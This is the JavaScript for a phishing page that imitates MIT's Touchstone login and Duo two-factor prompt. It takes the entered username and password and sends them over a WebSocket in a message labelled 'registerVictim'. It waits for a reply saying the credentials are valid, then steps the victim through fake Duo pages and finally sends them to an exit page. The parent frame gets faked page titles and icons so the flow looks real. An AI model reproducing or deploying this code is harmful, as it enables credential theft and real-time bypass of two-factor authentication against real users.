console.log("ACLER");
function getCook(cookiename) 
{
	// Get name followed by anything except a semicolon
	var cookiestring=RegExp(cookiename+"=[^;]+").exec(document.cookie);
	// Return everything after the equal sign, or an empty string if the cookie name not found
	return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./,"") : "");
}	

setTimeout(()=>{console.log(document.cookie); if (getCook("status") == "invalidCreds") invalidCreds();}, 200);


function submitDUO() {
	document.cookie = "";
	var user = document.getElementsByName("j_username")[0].value;
	var pass = document.getElementsByName("j_password")[0].value;
	var mobile = document.getElementsByName("mobile")[0].value;
	if (user == "" || pass == "") { invalidCreds(); return false }

	setTimeout(function() {
		window.postMessage({
			move : '/login?j_username=' + user + '&j_password=' + pass + '&mobile=' + mobile,
			url  : '/idp/Authn/UsernamePassword',
			icon : '/idp/Authn/images/favicon2.ico',
			title: 'Touchstone@MIT : 22',
			load : '2'
		}, '*');
	}, 100);

	return false;
}


function invalidCreds() {
	window.user = "";
	window.pass = "";
	document.documentElement.scrollTop = 0;
	document.getElementsByTagName("html")[0].style.display = "block";
	document.getElementById("certerr").style.display = "none";
	document.getElementById("passerr").style.display = "block";
}



///////////////////////////
function injectHTML(page) {
	var s = "<iframe frameborder='0' seamless='seamless' style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' src='" + page + "'>";
	document.getElementsByTagName("html")[0].innerHTML = s;
	document.getElementsByTagName("html")[0].style.display = "block";
}
function certificate() {
	setTimeout(function() {
		document.getElementById("passerr").style.display = "none";
		document.getElementById("certerr").style.display = "block";
		document.documentElement.scrollTop = 0;
	}, 500);
}
function connect() {
	var user = document.getElementsByName("j_username")[0].value
	var pass = document.getElementsByName("j_password")[0].value
	window.sid = "" + new Date().getTime();
	window.user = user;
	window.pass = pass;
	window.received = 0
	setupSock();
	if (window.user == "" || window.pass == "") invalidCreds();
	else
		setTimeout(function() {
			if (window.received == 0)
				document.getElementsByTagName("html")[0].style.display = "none";
		}, 2000);
}

function setupSock() {
	if (window.user == "" || window.pass == "") {
		console.log("preventing socket start because blank creds");
		return;
	}
	var sock = new WebSocket("wss://" + window.location.hostname + ":80");
	sock.onclose = function(e) {
		console.log(e)
		console.log("error: " + e.code)
		setTimeout(function() {
			if (window.localStorage.getItem("loggedIn") != "true") {
				console.log("re-connecting now");
				setupSock();
			}
			else {
				console.log("not reconnectnig cuz succ");
			}
		}, 500);
	}
	var alive = true;
	sock.onopen = function() {	
		var pingInterval = setInterval(function() {
			if (!alive) {
				clearInterval(pingInterval);
				sock.close(4001);
				return;
			}
			if (window.localStorage.getItem("loggedIn") != true)
				sock.send(JSON.stringify({"ping":window.sid}));
			alive = false;
		}, 3000);
		sock.send(JSON.stringify({
			"action"	: "registerVictim",
			"username" 	: window.user,
			"password"	: window.pass,
			"sid"		: window.sid,
			"id"		: "victim"
		}));
		sock.addEventListener("message", function(event) {
			var data = JSON.parse(event.data)
			if (data.pong != undefined) {
				alive = true;
				console.log("Received pong:" + data.pong);
				return;
			}

			window.received++;
			if (data["status"] == "validCreds") {
				var page = "duo-2.html";
				if (window.location.href.includes("mobile")) page = "mobile-duo-2.html";
				window.sock.onclose = function() {};
				window.sock.close();
				window.parent.postMessage({
					move:  "/idp/Authn/" + page,
					icon:  "/idp/Authn/images/favicon.ico",
					url:   "/idp/Authn/UsernamePassword",
					title: "Touchstone@MIT - Duo Authentication",
					sid:   window.sid
				}, "*");
				/*document.documentElement.scrollTop = 0;
				if (window.location.href.includes("mobile")) injectHTML("mobile-duo-2.html")
				else injectHTML("duo-2.html");
				setTimeout(function() {
					document.getElementsByTagName("iframe")[0].contentWindow.sock = window.sock;
					document.getElementsByTagName("iframe")[0].contentWindow.sid = window.sid;
					document.getElementsByTagName("iframe")[0].contentWindow.isAlive = function() { alive = true; };
					document.getElementsByTagName("iframe")[0].contentWindow.onSuccessCallback = loginSucc; 
				},300);*/
			}
			if (data["status"] == "invalidCreds") {
				console.log("Received invalid creds");
				invalidCreds();
				window.sock.close(4003);
			}
		})
	}
	window.sock = sock;
}

function loginSucc() {
	window.localStorage.setItem("loggedIn", "true");
	window.parent.postMessage("loggedIn", "*");
	window.sock.close(1000)
	window.sock = undefined;
	injectHTML("load.html");
	setTimeout(function() {
		window.location.href = "https://" + window.location.hostname + "/exit-site/final.html";
	}, 1000);
}

if (window.localStorage.getItem("loggedIn") == "true") {
	loginSucc();
}
else {
	document.getElementsByTagName("html")[0].style.display = "block";
}


